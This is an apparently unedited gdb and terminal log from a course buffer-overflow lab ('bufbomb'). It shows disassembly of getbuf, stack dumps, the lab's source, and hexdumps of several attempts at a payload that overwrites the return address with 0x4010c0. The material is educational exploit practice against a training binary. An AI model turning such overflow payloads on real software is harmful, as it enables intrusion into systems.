ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) n 4
137	  variable_length = alloca((val % 40) < 36 ? 36 : val % 40);
(gdb) disas
Dump of assembler code for function getbuf:
   0x0000000000400da0 <+0>:	push   %rbp
   0x0000000000400da1 <+1>:	mov    %rsp,%rbp
   0x0000000000400da4 <+4>:	sub    $0x30,%rsp
   0x0000000000400da8 <+8>:	lea    -0x30(%rbp),%rdi
   0x0000000000400dac <+12>:	callq  0x400cb0 <Gets>
   0x0000000000400db1 <+17>:	movabs $0xcccccccccccccccd,%rdx
   0x0000000000400dbb <+27>:	mov    %rax,%rcx
=> 0x0000000000400dbe <+30>:	mul    %rdx
   0x0000000000400dc1 <+33>:	shr    $0x5,%rdx
   0x0000000000400dc5 <+37>:	lea    (%rdx,%rdx,4),%rax
   0x0000000000400dc9 <+41>:	mov    %rcx,%rdx
   0x0000000000400dcc <+44>:	shl    $0x3,%rax
   0x0000000000400dd0 <+48>:	sub    %rax,%rdx
   0x0000000000400dd3 <+51>:	mov    $0x24,%eax
   0x0000000000400dd8 <+56>:	cmp    $0x24,%rdx
   0x0000000000400ddc <+60>:	cmovae %rdx,%rax
   0x0000000000400de0 <+64>:	xor    %ecx,%ecx
   0x0000000000400de2 <+66>:	add    $0x1e,%rax
   0x0000000000400de6 <+70>:	and    $0xfffffffffffffff0,%rax
   0x0000000000400dea <+74>:	sub    %rax,%rsp
   0x0000000000400ded <+77>:	lea    0xf(%rsp),%r8
   0x0000000000400df2 <+82>:	and    $0xfffffffffffffff0,%r8
   0x0000000000400df6 <+86>:	nopw   %cs:0x0(%rax,%rax,1)
   0x0000000000400e00 <+96>:	movzbl -0x30(%rbp,%rcx,1),%edi
   0x0000000000400e05 <+101>:	lea    (%r8,%rcx,1),%rsi
   0x0000000000400e09 <+105>:	add    $0x1,%rcx
   0x0000000000400e0d <+109>:	cmp    $0x24,%rcx
   0x0000000000400e11 <+113>:	mov    %dil,(%rsi)
   0x0000000000400e14 <+116>:	jne    0x400e00 <getbuf+96>
   0x0000000000400e16 <+118>:	mov    %rdx,%rax
   0x0000000000400e19 <+121>:	leaveq 
   0x0000000000400e1a <+122>:	retq   
---Type <return> to continue, or q <return> to quit---
End of assembler dump.
(gdb) x /32wx $rsp
0x7fffffffbb50:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffbb60:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffbb70:	0x004010c0	0x00000000	0xc7eba477	0x00000030
0x7fffffffbb80:	0xffffbbb0	0x00007fff	0x00400ef3	0x00000000
0x7fffffffbb90:	0xffffbbc0	0x00007fff	0xdeadbeef	0x00000000
0x7fffffffbba0:	0xc81b0120	0x00000030	0x5d163430	0x00000000
0x7fffffffbbb0:	0xffffe650	0x00007fff	0x00400fdd	0x00000000
0x7fffffffbbc0:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
(gdb) k
Kill the program being debugged? (y or n) y
(gdb) q
(none): /home/auser/course-materials/lab3 auser$: hexdump -C smoke.bytes
00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000020  c0 10 40 00 0a                                    |..@..|
00000025
.bytes: /home/auser/course-materials/lab3 auser$: hexdump -C smoke.bytes.
00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 c0 10  |................|
00000040  40 00 0a                                
(none): /home/auser/course-materials/lab3 auser$: gdb ./bufbomb
GNU gdb (GDB) Fedora (7.4.50.20120120-54.fc17)
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /home/auser/course-materials/lab3/bufbomb...done.
(gdb) break getbuf
Breakpoint 1 at 0x400da0: file bufbomb.c, line 132.
(gdb) r -u 3279655 < smoke.bytes
Starting program: /home/auser/course-materials/lab3/bufbomb -u 3279655 < smoke.bytes
Username: 3279655
bb
1e
5e
28
57
93
bb
61
Cookie: 0x61bb9357285e1ebb

Breakpoint 1, getbuf () at bufbomb.c:132
132	{
(gdb) disas
Dump of assembler code for function getbuf:
=> 0x0000000000400da0 <+0>:	push   %rbp
   0x0000000000400da1 <+1>:	mov    %rsp,%rbp
   0x0000000000400da4 <+4>:	sub    $0x30,%rsp
   0x0000000000400da8 <+8>:	lea    -0x30(%rbp),%rdi
   0x0000000000400dac <+12>:	callq  0x400cb0 <Gets>
   0x0000000000400db1 <+17>:	movabs $0xcccccccccccccccd,%rdx
   0x0000000000400dbb <+27>:	mov    %rax,%rcx
   0x0000000000400dbe <+30>:	mul    %rdx
   0x0000000000400dc1 <+33>:	shr    $0x5,%rdx
   0x0000000000400dc5 <+37>:	lea    (%rdx,%rdx,4),%rax
   0x0000000000400dc9 <+41>:	mov    %rcx,%rdx
   0x0000000000400dcc <+44>:	shl    $0x3,%rax
   0x0000000000400dd0 <+48>:	sub    %rax,%rdx
   0x0000000000400dd3 <+51>:	mov    $0x24,%eax
   0x0000000000400dd8 <+56>:	cmp    $0x24,%rdx
   0x0000000000400ddc <+60>:	cmovae %rdx,%rax
   0x0000000000400de0 <+64>:	xor    %ecx,%ecx
   0x0000000000400de2 <+66>:	add    $0x1e,%rax
   0x0000000000400de6 <+70>:	and    $0xfffffffffffffff0,%rax
   0x0000000000400dea <+74>:	sub    %rax,%rsp
   0x0000000000400ded <+77>:	lea    0xf(%rsp),%r8
   0x0000000000400df2 <+82>:	and    $0xfffffffffffffff0,%r8
   0x0000000000400df6 <+86>:	nopw   %cs:0x0(%rax,%rax,1)
   0x0000000000400e00 <+96>:	movzbl -0x30(%rbp,%rcx,1),%edi
   0x0000000000400e05 <+101>:	lea    (%r8,%rcx,1),%rsi
   0x0000000000400e09 <+105>:	add    $0x1,%rcx
   0x0000000000400e0d <+109>:	cmp    $0x24,%rcx
   0x0000000000400e11 <+113>:	mov    %dil,(%rsi)
   0x0000000000400e14 <+116>:	jne    0x400e00 <getbuf+96>
   0x0000000000400e16 <+118>:	mov    %rdx,%rax
   0x0000000000400e19 <+121>:	leaveq 
   0x0000000000400e1a <+122>:	retq   
---Type <return> to continue, or q <return> to quit---
End of assembler dump.
(gdb) info r
rax            0x0	0
rbx            0x5d163430	1561736240
rcx            0xdeadbeef	3735928559
rdx            0x30c81b2ae0	209515653856
rsi            0xc	12
rdi            0x0	0
rbp            0x7fffffffbbb0	0x7fffffffbbb0
rsp            0x7fffffffbb88	0x7fffffffbb88
r8             0x401337	4199223
r9             0x7ffff7ffb000	140737354117120
r10            0x0	0
r11            0x30c7e88729	209512335145
r12            0x607f80	6324096
r13            0x7fffffffe750	140737488349008
r14            0x0	0
r15            0x0	0
rip            0x400da0	0x400da0 <getbuf>
eflags         0x206	[ PF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) x /32wx $rsp
0x7fffffffbb88:	0x00400ef3	0x00000000	0xffffbbc0	0x00007fff
0x7fffffffbb98:	0xdeadbeef	0x00000000	0xc81b0120	0x00000030
0x7fffffffbba8:	0x5d163430	0x00000000	0xffffe650	0x00007fff
0x7fffffffbbb8:	0x00400fdd	0x00000000	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbc8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbd8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbe8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbf8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
(gdb) n 3
136	  unsigned long long val = (unsigned long long)Gets(buf);
(gdb) disas
Dump of assembler code for function getbuf:
   0x0000000000400da0 <+0>:	push   %rbp
   0x0000000000400da1 <+1>:	mov    %rsp,%rbp
   0x0000000000400da4 <+4>:	sub    $0x30,%rsp
   0x0000000000400da8 <+8>:	lea    -0x30(%rbp),%rdi
   0x0000000000400dac <+12>:	callq  0x400cb0 <Gets>
   0x0000000000400db1 <+17>:	movabs $0xcccccccccccccccd,%rdx
=> 0x0000000000400dbb <+27>:	mov    %rax,%rcx
   0x0000000000400dbe <+30>:	mul    %rdx
   0x0000000000400dc1 <+33>:	shr    $0x5,%rdx
   0x0000000000400dc5 <+37>:	lea    (%rdx,%rdx,4),%rax
   0x0000000000400dc9 <+41>:	mov    %rcx,%rdx
   0x0000000000400dcc <+44>:	shl    $0x3,%rax
   0x0000000000400dd0 <+48>:	sub    %rax,%rdx
   0x0000000000400dd3 <+51>:	mov    $0x24,%eax
   0x0000000000400dd8 <+56>:	cmp    $0x24,%rdx
   0x0000000000400ddc <+60>:	cmovae %rdx,%rax
   0x0000000000400de0 <+64>:	xor    %ecx,%ecx
   0x0000000000400de2 <+66>:	add    $0x1e,%rax
   0x0000000000400de6 <+70>:	and    $0xfffffffffffffff0,%rax
   0x0000000000400dea <+74>:	sub    %rax,%rsp
   0x0000000000400ded <+77>:	lea    0xf(%rsp),%r8
   0x0000000000400df2 <+82>:	and    $0xfffffffffffffff0,%r8
   0x0000000000400df6 <+86>:	nopw   %cs:0x0(%rax,%rax,1)
   0x0000000000400e00 <+96>:	movzbl -0x30(%rbp,%rcx,1),%edi
   0x0000000000400e05 <+101>:	lea    (%r8,%rcx,1),%rsi
   0x0000000000400e09 <+105>:	add    $0x1,%rcx
   0x0000000000400e0d <+109>:	cmp    $0x24,%rcx
   0x0000000000400e11 <+113>:	mov    %dil,(%rsi)
   0x0000000000400e14 <+116>:	jne    0x400e00 <getbuf+96>
   0x0000000000400e16 <+118>:	mov    %rdx,%rax
   0x0000000000400e19 <+121>:	leaveq 
   0x0000000000400e1a <+122>:	retq   
---Type <return> to continue, or q <return> to quit---
End of assembler dump.
(gdb) x /32wx $rsp
0x7fffffffbb50:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffbb60:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffbb70:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffbb80:	0x00000000	0x00000000	0x00000000	0x10c00000
0x7fffffffbb90:	0xff000040	0x00007fff	0xdeadbeef	0x00000000
0x7fffffffbba0:	0xc81b0120	0x00000030	0x5d163430	0x00000000
0x7fffffffbbb0:	0xffffe650	0x00007fff	0x00400fdd	0x00000000
0x7fffffffbbc0:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
(gdb) k
Kill the program being debugged? (y or n) y
(gdb) q
.bytes: /home/auser/course-materials/lab3 auser$: hexdump -C smoke.bytes
00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000030  00 00 00 00 00 00 00 00  00 00 00 00 c0 10 40 00  |..............@.|
00000040  0a                                                |.|
00000041                                          gdb ./bufbomb
GNU gdb (GDB) Fedora (7.4.50.20120120-54.fc17)
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /home/auser/course-materials/lab3/bufbomb...done.
(gdb) break getbug
Function "getbug" not defined.
Make breakpoint pending on future shared library load? (y or [n]) n
(gdb) break getbuf
Breakpoint 1 at 0x400da0: file bufbomb.c, line 132.
(gdb) r -u 3279655 < smoke.bytes
Starting program: /home/auser/course-materials/lab3/bufbomb -u 3279655 < smoke.bytes
Username: 3279655
bb
1e
5e
28
57
93
bb
61
Cookie: 0x61bb9357285e1ebb

Breakpoint 1, getbuf () at bufbomb.c:132
132	{
(gdb) disas
Dump of assembler code for function getbuf:
=> 0x0000000000400da0 <+0>:	push   %rbp
   0x0000000000400da1 <+1>:	mov    %rsp,%rbp
   0x0000000000400da4 <+4>:	sub    $0x30,%rsp
   0x0000000000400da8 <+8>:	lea    -0x30(%rbp),%rdi
   0x0000000000400dac <+12>:	callq  0x400cb0 <Gets>
   0x0000000000400db1 <+17>:	movabs $0xcccccccccccccccd,%rdx
   0x0000000000400dbb <+27>:	mov    %rax,%rcx
   0x0000000000400dbe <+30>:	mul    %rdx
   0x0000000000400dc1 <+33>:	shr    $0x5,%rdx
   0x0000000000400dc5 <+37>:	lea    (%rdx,%rdx,4),%rax
   0x0000000000400dc9 <+41>:	mov    %rcx,%rdx
   0x0000000000400dcc <+44>:	shl    $0x3,%rax
   0x0000000000400dd0 <+48>:	sub    %rax,%rdx
   0x0000000000400dd3 <+51>:	mov    $0x24,%eax
   0x0000000000400dd8 <+56>:	cmp    $0x24,%rdx
   0x0000000000400ddc <+60>:	cmovae %rdx,%rax
   0x0000000000400de0 <+64>:	xor    %ecx,%ecx
   0x0000000000400de2 <+66>:	add    $0x1e,%rax
   0x0000000000400de6 <+70>:	and    $0xfffffffffffffff0,%rax
   0x0000000000400dea <+74>:	sub    %rax,%rsp
   0x0000000000400ded <+77>:	lea    0xf(%rsp),%r8
   0x0000000000400df2 <+82>:	and    $0xfffffffffffffff0,%r8
   0x0000000000400df6 <+86>:	nopw   %cs:0x0(%rax,%rax,1)
   0x0000000000400e00 <+96>:	movzbl -0x30(%rbp,%rcx,1),%edi
   0x0000000000400e05 <+101>:	lea    (%r8,%rcx,1),%rsi
   0x0000000000400e09 <+105>:	add    $0x1,%rcx
   0x0000000000400e0d <+109>:	cmp    $0x24,%rcx
   0x0000000000400e11 <+113>:	mov    %dil,(%rsi)
   0x0000000000400e14 <+116>:	jne    0x400e00 <getbuf+96>
   0x0000000000400e16 <+118>:	mov    %rdx,%rax
   0x0000000000400e19 <+121>:	leaveq 
   0x0000000000400e1a <+122>:	retq   
---Type <return> to continue, or q <return> to quit---
End of assembler dump.
(gdb) x /32wx $rsp
0x7fffffffbb88:	0x00400ef3	0x00000000	0xffffbbc0	0x00007fff
0x7fffffffbb98:	0xdeadbeef	0x00000000	0xc81b0120	0x00000030
0x7fffffffbba8:	0x5d163430	0x00000000	0xffffe650	0x00007fff
0x7fffffffbbb8:	0x00400fdd	0x00000000	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbc8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbd8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbe8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbf8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
(gdb) n 2
137	  variable_length = alloca((val % 40) < 36 ? 36 : val % 40);
(gdb) disas
Dump of assembler code for function getbuf:
   0x0000000000400da0 <+0>:	push   %rbp
   0x0000000000400da1 <+1>:	mov    %rsp,%rbp
   0x0000000000400da4 <+4>:	sub    $0x30,%rsp
   0x0000000000400da8 <+8>:	lea    -0x30(%rbp),%rdi
   0x0000000000400dac <+12>:	callq  0x400cb0 <Gets>
=> 0x0000000000400db1 <+17>:	movabs $0xcccccccccccccccd,%rdx
   0x0000000000400dbb <+27>:	mov    %rax,%rcx
   0x0000000000400dbe <+30>:	mul    %rdx
   0x0000000000400dc1 <+33>:	shr    $0x5,%rdx
   0x0000000000400dc5 <+37>:	lea    (%rdx,%rdx,4),%rax
   0x0000000000400dc9 <+41>:	mov    %rcx,%rdx
   0x0000000000400dcc <+44>:	shl    $0x3,%rax
   0x0000000000400dd0 <+48>:	sub    %rax,%rdx
   0x0000000000400dd3 <+51>:	mov    $0x24,%eax
   0x0000000000400dd8 <+56>:	cmp    $0x24,%rdx
   0x0000000000400ddc <+60>:	cmovae %rdx,%rax
   0x0000000000400de0 <+64>:	xor    %ecx,%ecx
   0x0000000000400de2 <+66>:	add    $0x1e,%rax
   0x0000000000400de6 <+70>:	and    $0xfffffffffffffff0,%rax
   0x0000000000400dea <+74>:	sub    %rax,%rsp
   0x0000000000400ded <+77>:	lea    0xf(%rsp),%r8
   0x0000000000400df2 <+82>:	and    $0xfffffffffffffff0,%r8
   0x0000000000400df6 <+86>:	nopw   %cs:0x0(%rax,%rax,1)
   0x0000000000400e00 <+96>:	movzbl -0x30(%rbp,%rcx,1),%edi
   0x0000000000400e05 <+101>:	lea    (%r8,%rcx,1),%rsi
   0x0000000000400e09 <+105>:	add    $0x1,%rcx
   0x0000000000400e0d <+109>:	cmp    $0x24,%rcx
   0x0000000000400e11 <+113>:	mov    %dil,(%rsi)
   0x0000000000400e14 <+116>:	jne    0x400e00 <getbuf+96>
   0x0000000000400e16 <+118>:	mov    %rdx,%rax
   0x0000000000400e19 <+121>:	leaveq 
   0x0000000000400e1a <+122>:	retq   
---Type <return> to continue, or q <return> to quit---
End of assembler dump.
(gdb) x /32wx $rsp
0x7fffffffbb50:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffbb60:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffbb70:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffbb80:	0x00000000	0x00000000	0x00000000	0x004010c0
0x7fffffffbb90:	0xffffbb00	0x00007fff	0xdeadbeef	0x00000000
0x7fffffffbba0:	0xc81b0120	0x00000030	0x5d163430	0x00000000
0x7fffffffbbb0:	0xffffe650	0x00007fff	0x00400fdd	0x00000000
0x7fffffffbbc0:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
(gdb) k
Kill the program being debugged? (y or n) y
(gdb) q
.bytes: /home/auser/course-materials/lab3 auser$: hexdump -C smoke.bytes
00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000030  00 00 00 00 00 00 00 00  c0 10 40 00 0a           |..........@..|
0000003d                                          gdb ./bufbomb
GNU gdb (GDB) Fedora (7.4.50.20120120-54.fc17)
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /home/auser/course-materials/lab3/bufbomb...done.
(gdb) break getbuf
Breakpoint 1 at 0x400da0: file bufbomb.c, line 132.
(gdb) r -u 3279655 < smoke.bytes
Starting program: /home/auser/course-materials/lab3/bufbomb -u 3279655 < smoke.bytes
Username: 3279655
bb
1e
5e
28
57
93
bb
61
Cookie: 0x61bb9357285e1ebb

Breakpoint 1, getbuf () at bufbomb.c:132
132	{
(gdb) disas
Dump of assembler code for function getbuf:
=> 0x0000000000400da0 <+0>:	push   %rbp
   0x0000000000400da1 <+1>:	mov    %rsp,%rbp
   0x0000000000400da4 <+4>:	sub    $0x30,%rsp
   0x0000000000400da8 <+8>:	lea    -0x30(%rbp),%rdi
   0x0000000000400dac <+12>:	callq  0x400cb0 <Gets>
   0x0000000000400db1 <+17>:	movabs $0xcccccccccccccccd,%rdx
   0x0000000000400dbb <+27>:	mov    %rax,%rcx
   0x0000000000400dbe <+30>:	mul    %rdx
   0x0000000000400dc1 <+33>:	shr    $0x5,%rdx
   0x0000000000400dc5 <+37>:	lea    (%rdx,%rdx,4),%rax
   0x0000000000400dc9 <+41>:	mov    %rcx,%rdx
   0x0000000000400dcc <+44>:	shl    $0x3,%rax
   0x0000000000400dd0 <+48>:	sub    %rax,%rdx
   0x0000000000400dd3 <+51>:	mov    $0x24,%eax
   0x0000000000400dd8 <+56>:	cmp    $0x24,%rdx
   0x0000000000400ddc <+60>:	cmovae %rdx,%rax
   0x0000000000400de0 <+64>:	xor    %ecx,%ecx
   0x0000000000400de2 <+66>:	add    $0x1e,%rax
   0x0000000000400de6 <+70>:	and    $0xfffffffffffffff0,%rax
   0x0000000000400dea <+74>:	sub    %rax,%rsp
   0x0000000000400ded <+77>:	lea    0xf(%rsp),%r8
   0x0000000000400df2 <+82>:	and    $0xfffffffffffffff0,%r8
   0x0000000000400df6 <+86>:	nopw   %cs:0x0(%rax,%rax,1)
   0x0000000000400e00 <+96>:	movzbl -0x30(%rbp,%rcx,1),%edi
   0x0000000000400e05 <+101>:	lea    (%r8,%rcx,1),%rsi
   0x0000000000400e09 <+105>:	add    $0x1,%rcx
   0x0000000000400e0d <+109>:	cmp    $0x24,%rcx
   0x0000000000400e11 <+113>:	mov    %dil,(%rsi)
   0x0000000000400e14 <+116>:	jne    0x400e00 <getbuf+96>
   0x0000000000400e16 <+118>:	mov    %rdx,%rax
   0x0000000000400e19 <+121>:	leaveq 
   0x0000000000400e1a <+122>:	retq   
---Type <return> to continue, or q <return> to quit---
End of assembler dump.
(gdb) x /32wx $rsp
0x7fffffffbb88:	0x00400ef3	0x00000000	0xffffbbc0	0x00007fff
0x7fffffffbb98:	0xdeadbeef	0x00000000	0xc81b0120	0x00000030
0x7fffffffbba8:	0x5d163430	0x00000000	0xffffe650	0x00007fff
0x7fffffffbbb8:	0x00400fdd	0x00000000	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbc8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbd8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbe8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
0x7fffffffbbf8:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
(gdb) n 2
137	  variable_length = alloca((val % 40) < 36 ? 36 : val % 40);
(gdb) disas
Dump of assembler code for function getbuf:
   0x0000000000400da0 <+0>:	push   %rbp
   0x0000000000400da1 <+1>:	mov    %rsp,%rbp
   0x0000000000400da4 <+4>:	sub    $0x30,%rsp
   0x0000000000400da8 <+8>:	lea    -0x30(%rbp),%rdi
   0x0000000000400dac <+12>:	callq  0x400cb0 <Gets>
=> 0x0000000000400db1 <+17>:	movabs $0xcccccccccccccccd,%rdx
   0x0000000000400dbb <+27>:	mov    %rax,%rcx
   0x0000000000400dbe <+30>:	mul    %rdx
   0x0000000000400dc1 <+33>:	shr    $0x5,%rdx
   0x0000000000400dc5 <+37>:	lea    (%rdx,%rdx,4),%rax
   0x0000000000400dc9 <+41>:	mov    %rcx,%rdx
   0x0000000000400dcc <+44>:	shl    $0x3,%rax
   0x0000000000400dd0 <+48>:	sub    %rax,%rdx
   0x0000000000400dd3 <+51>:	mov    $0x24,%eax
   0x0000000000400dd8 <+56>:	cmp    $0x24,%rdx
   0x0000000000400ddc <+60>:	cmovae %rdx,%rax
   0x0000000000400de0 <+64>:	xor    %ecx,%ecx
   0x0000000000400de2 <+66>:	add    $0x1e,%rax
   0x0000000000400de6 <+70>:	and    $0xfffffffffffffff0,%rax
   0x0000000000400dea <+74>:	sub    %rax,%rsp
   0x0000000000400ded <+77>:	lea    0xf(%rsp),%r8
   0x0000000000400df2 <+82>:	and    $0xfffffffffffffff0,%r8
   0x0000000000400df6 <+86>:	nopw   %cs:0x0(%rax,%rax,1)
   0x0000000000400e00 <+96>:	movzbl -0x30(%rbp,%rcx,1),%edi
   0x0000000000400e05 <+101>:	lea    (%r8,%rcx,1),%rsi
   0x0000000000400e09 <+105>:	add    $0x1,%rcx
   0x0000000000400e0d <+109>:	cmp    $0x24,%rcx
   0x0000000000400e11 <+113>:	mov    %dil,(%rsi)
   0x0000000000400e14 <+116>:	jne    0x400e00 <getbuf+96>
   0x0000000000400e16 <+118>:	mov    %rdx,%rax
   0x0000000000400e19 <+121>:	leaveq 
   0x0000000000400e1a <+122>:	retq   
---Type <return> to continue, or q <return> to quit---
End of assembler dump.
(gdb) x /24wx $rsp
0x7fffffffbb50:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffbb60:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffbb70:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffbb80:	0x00000000	0x00000000	0x004010c0	0x00000000
0x7fffffffbb90:	0xffffbbc0	0x00007fff	0xdeadbeef	0x00000000
0x7fffffffbba0:	0xc81b0120	0x00000030	0x5d163430	0x00000000
(gdb) n
136	  unsigned long long val = (unsigned long long)Gets(buf);
(gdb) 
137	  variable_length = alloca((val % 40) < 36 ? 36 : val % 40);
(gdb) 
140		variable_length[i] = buf[i];
(gdb) 
131	unsigned long long getbuf()
(gdb) list
126	  }
127	}
128	/* $end boom-c */
129	
130	/* $begin getbuf-c */
131	unsigned long long getbuf()
132	{
133	  char buf[36];
134	  volatile char* variable_length;
135	  int i;
(gdb) 
136	  unsigned long long val = (unsigned long long)Gets(buf);
137	  variable_length = alloca((val % 40) < 36 ? 36 : val % 40);
138	  for(i = 0; i < 36; i++)
139	  {
140		variable_length[i] = buf[i];
141	  }
142	  return val % 40;
143	}
144	/* $end getbuf-c */
145	
(gdb) 
146	/* /\* $begin kaboom-c *\/ */
147	/* int getbufn() */
148	/* { */
149	/*     char buf[512]; */
150	/*     Gets(buf); */
151	/*     return 1; */
152	/* } */
153	/* /\* $end kaboom-c *\/ */
154	
155	/* void testn() */
(gdb) disas
Dump of assembler code for function getbuf:
   0x0000000000400da0 <+0>:	push   %rbp
   0x0000000000400da1 <+1>:	mov    %rsp,%rbp
   0x0000000000400da4 <+4>:	sub    $0x30,%rsp
   0x0000000000400da8 <+8>:	lea    -0x30(%rbp),%rdi
   0x0000000000400dac <+12>:	callq  0x400cb0 <Gets>
   0x0000000000400db1 <+17>:	movabs $0xcccccccccccccccd,%rdx
   0x0000000000400dbb <+27>:	mov    %rax,%rcx
   0x0000000000400dbe <+30>:	mul    %rdx
   0x0000000000400dc1 <+33>:	shr    $0x5,%rdx
   0x0000000000400dc5 <+37>:	lea    (%rdx,%rdx,4),%rax
   0x0000000000400dc9 <+41>:	mov    %rcx,%rdx
   0x0000000000400dcc <+44>:	shl    $0x3,%rax
   0x0000000000400dd0 <+48>:	sub    %rax,%rdx
   0x0000000000400dd3 <+51>:	mov    $0x24,%eax
   0x0000000000400dd8 <+56>:	cmp    $0x24,%rdx
   0x0000000000400ddc <+60>:	cmovae %rdx,%rax
   0x0000000000400de0 <+64>:	xor    %ecx,%ecx
   0x0000000000400de2 <+66>:	add    $0x1e,%rax
   0x0000000000400de6 <+70>:	and    $0xfffffffffffffff0,%rax
   0x0000000000400dea <+74>:	sub    %rax,%rsp
   0x0000000000400ded <+77>:	lea    0xf(%rsp),%r8
   0x0000000000400df2 <+82>:	and    $0xfffffffffffffff0,%r8
   0x0000000000400df6 <+86>:	nopw   %cs:0x0(%rax,%rax,1)
   0x0000000000400e00 <+96>:	movzbl -0x30(%rbp,%rcx,1),%edi
=> 0x0000000000400e05 <+101>:	lea    (%r8,%rcx,1),%rsi
   0x0000000000400e09 <+105>:	add    $0x1,%rcx
   0x0000000000400e0d <+109>:	cmp    $0x24,%rcx
   0x0000000000400e11 <+113>:	mov    %dil,(%rsi)
   0x0000000000400e14 <+116>:	jne    0x400e00 <getbuf+96>
   0x0000000000400e16 <+118>:	mov    %rdx,%rax
   0x0000000000400e19 <+121>:	leaveq 
   0x0000000000400e1a <+122>:	retq   
---Type <return> to continue, or q <return> to quit---
End of assembler dump.
(gdb) 
(gdb) disas
Dump of assembler code for function getbuf:
   0x0000000000400da0 <+0>:	push   %rbp
   0x0000000000400da1 <+1>:	mov    %rsp,%rbp
   0x0000000000400da4 <+4>:	sub    $0x30,%rsp
   0x0000000000400da8 <+8>:	lea    -0x30(%rbp),%rdi
   0x0000000000400dac <+12>:	callq  0x400cb0 <Gets>
   0x0000000000400db1 <+17>:	movabs $0xcccccccccccccccd,%rdx
   0x0000000000400dbb <+27>:	mov    %rax,%rcx
   0x0000000000400dbe <+30>:	mul    %rdx
   0x0000000000400dc1 <+33>:	shr    $0x5,%rdx
   0x0000000000400dc5 <+37>:	lea    (%rdx,%rdx,4),%rax
   0x0000000000400dc9 <+41>:	mov    %rcx,%rdx
   0x0000000000400dcc <+44>:	shl    $0x3,%rax
   0x0000000000400dd0 <+48>:	sub    %rax,%rdx
   0x0000000000400dd3 <+51>:	mov    $0x24,%eax
   0x0000000000400dd8 <+56>:	cmp    $0x24,%rdx
   0x0000000000400ddc <+60>:	cmovae %rdx,%rax
   0x0000000000400de0 <+64>:	xor    %ecx,%ecx
   0x0000000000400de2 <+66>:	add    $0x1e,%rax
   0x0000000000400de6 <+70>:	and    $0xfffffffffffffff0,%rax
   0x0000000000400dea <+74>:	sub    %rax,%rsp
   0x0000000000400ded <+77>:	lea    0xf(%rsp),%r8
   0x0000000000400df2 <+82>:	and    $0xfffffffffffffff0,%r8
   0x0000000000400df6 <+86>:	nopw   %cs:0x0(%rax,%rax,1)
   0x0000000000400e00 <+96>:	movzbl -0x30(%rbp,%rcx,1),%edi
=> 0x0000000000400e05 <+101>:	lea    (%r8,%rcx,1),%rsi
   0x0000000000400e09 <+105>:	add    $0x1,%rcx
   0x0000000000400e0d <+109>:	cmp    $0x24,%rcx
   0x0000000000400e11 <+113>:	mov    %dil,(%rsi)
   0x0000000000400e14 <+116>:	jne    0x400e00 <getbuf+96>
   0x0000000000400e16 <+118>:	mov    %rdx,%rax
